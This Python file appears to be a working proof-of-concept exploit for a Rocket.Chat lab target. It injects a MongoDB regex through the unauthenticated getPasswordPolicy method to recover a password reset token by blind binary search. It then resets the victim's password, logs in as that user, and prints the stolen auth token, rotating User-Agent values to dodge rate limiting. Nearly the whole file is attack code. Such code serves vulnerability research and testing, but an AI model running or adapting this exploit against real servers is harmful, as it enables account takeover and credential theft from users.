"""Recover a Rocket.Chat reset token and prove victim account access."""

import json
import os
import re
import secrets
import string
import time
import urllib.error
import urllib.request


EMAIL = "vulhub@vulhub.org"
USERNAME = "vulhub"
ALPHABET = "-_" + string.digits + string.ascii_letters


def request_json(
    url: str, payload: dict[str, object], attempts: int = 4
) -> tuple[int, dict[str, object]]:
    """Send one anonymous method call with an independent rate limit key."""
    body = json.dumps(payload).encode("utf-8")
    for attempt in range(attempts):
        request = urllib.request.Request(
            url,
            data=body,
            headers={
                "Content-Type": "application/json",
                "User-Agent": f"rocket-poc-{secrets.token_hex(12)}",
            },
        )
        try:
            response = urllib.request.urlopen(request, timeout=12)
        except urllib.error.HTTPError as error:
            response = error
        parsed = json.loads(response.read().decode("utf-8"))
        if "too-many-requests" not in json.dumps(parsed):
            return response.status, parsed
        time.sleep(min(2 ** attempt, 8))
    raise RuntimeError("Rocket.Chat rate limit did not clear")


def call_method(
    base_url: str, method: str, params: list[object]
) -> dict[str, object]:
    """Call an unauthenticated Meteor method through Rocket.Chat REST."""
    message = {"msg": "method", "method": method, "params": params}
    status, wrapper = request_json(
        f"{base_url}/api/v1/method.callAnon/{method}",
        {"message": json.dumps(message)},
    )
    result = json.loads(str(wrapper.get("message", "{}")))
    if status != 200:
        raise RuntimeError(f"Method {method} returned HTTP {status}: {result}")
    return result


def token_prefix_exists(base_url: str, pattern: str) -> bool:
    """Observe whether a reset token matches an injected Mongo regex."""
    result = call_method(
        base_url, "getPasswordPolicy", [{"token": {"$regex": pattern}}]
    )
    error = result.get("error")
    if not error:
        return True
    if isinstance(error, dict) and error.get("error") == "error-invalid-user":
        return False
    raise RuntimeError(f"Unexpected password policy result: {result}")


def recover_reset_token(base_url: str) -> str:
    """Extract the freshly generated token by binary-searching its characters."""
    if not token_prefix_exists(base_url, "^"):
        raise RuntimeError("No active password reset token exists")
    token = ""
    for position in range(43):
        candidates = ALPHABET
        while len(candidates) > 1:
            split = len(candidates) // 2
            first = candidates[:split]
            pattern = "^" + re.escape(token) + "[" + re.escape(first) + "]"
            if token_prefix_exists(base_url, pattern):
                candidates = first
            else:
                candidates = candidates[split:]
        token += candidates
        if not token_prefix_exists(base_url, "^" + re.escape(token)):
            raise RuntimeError(f"Token recovery diverged at character {position}")
    if not token_prefix_exists(base_url, "^" + re.escape(token) + "$"):
        raise RuntimeError("Recovered token failed full-match confirmation")
    return token


def login(base_url: str, password: str) -> tuple[str, str]:
    """Exchange the reset password for the application's real auth token."""
    status, result = request_json(
        f"{base_url}/api/v1/login", {"user": USERNAME, "password": password}
    )
    if status != 200 or result.get("status") != "success":
        raise RuntimeError(f"Victim login failed: HTTP {status}: {result}")
    data = result.get("data")
    if not isinstance(data, dict):
        raise RuntimeError("Login response omitted credential data")
    return str(data["userId"]), str(data["authToken"])


def prove_identity(base_url: str, material: str) -> None:
    """Ensure the captured token reaches the protected victim identity."""
    request = urllib.request.Request(
        f"{base_url}/challenge/whoami",
        headers={"X-Rocket-Identity": material},
    )
    with urllib.request.urlopen(request, timeout=12) as response:
        identity = json.load(response)
    if identity.get("username") != USERNAME:
        raise RuntimeError(f"Protected identity mismatch: {identity}")


def main() -> None:
    """Reset the victim password through blind injection and report evidence."""
    base_url = os.environ["REMOTE_TARGET_URL"].rstrip("/")
    reset = call_method(base_url, "sendForgotPasswordEmail", [EMAIL])
    error = reset.get("error")
    if error and (not isinstance(error, dict) or
                  error.get("error") != "error-email-send-failed"):
        raise RuntimeError(f"Password reset request failed: {reset}")
    token = recover_reset_token(base_url)
    new_password = "Rocket-" + secrets.token_urlsafe(18) + "-1A!"
    result = call_method(base_url, "resetPassword", [token, new_password])
    if result.get("error"):
        raise RuntimeError(f"Password reset failed: {result}")
    user_id, auth_token = login(base_url, new_password)
    material = f"{user_id}:{auth_token}"
    prove_identity(base_url, material)
    print(json.dumps({
        "evidence_payload": {"token": material, "user": USERNAME},
        "token_length": len(token),
        "identity_verified": True,
    }))


if __name__ == "__main__":
    main()
